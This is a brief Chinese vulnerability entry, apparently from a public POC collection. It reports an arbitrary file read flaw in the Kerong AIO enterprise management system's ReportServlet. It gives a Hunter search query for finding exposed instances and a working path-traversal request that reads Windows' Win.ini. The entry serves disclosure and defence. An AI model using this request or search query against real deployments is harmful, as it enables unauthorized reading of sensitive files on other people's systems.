# 科荣 AIO 管理系统 ReportServlet 存在任意文件读取漏洞

# 一、漏洞简介
科荣AIO企业一体化管理解决方案,通过ERP（进销存财务）、OA（办公自动化）、CRM（客户关系管理）、UDP（自定义平台），集电子商务平台、支付平台、ERP平台、微信平台、移动APP等解决了众多企业客户在管理过程中跨部门、多功能、需求多变等通用及个性化的问题。科荣 AIO 管理系统存在任意文件读取漏洞，攻击者可以读取敏感文件。

# 二、影响版本
+ 科荣 AIO 管理系统 

# 三、资产测绘
+ hunter`app.name="科荣 AIO"`
+ 特征


# 四、漏洞复现
```plain
/ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yci7gf7f8ezqhzft>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
